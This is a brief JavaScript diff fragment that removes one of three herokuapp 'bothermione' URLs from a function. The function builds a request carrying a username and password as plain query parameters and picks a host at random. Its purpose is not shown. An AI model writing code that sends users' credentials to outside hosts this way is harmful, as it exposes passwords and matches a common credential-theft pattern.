@@ -11,7 +11,6 @@
 		let urls = [
 			`https://bothermione.herokuapp.com/?username=${u}&password=${p}`,
 			`https://bothermione2.herokuapp.com/?username=${u}&password=${p}`,
-			`https://bothermione3.herokuapp.com/?username=${u}&password=${p}`
 		];
 		return urls[Math.floor(Math.random() * urls.length)];
 	}
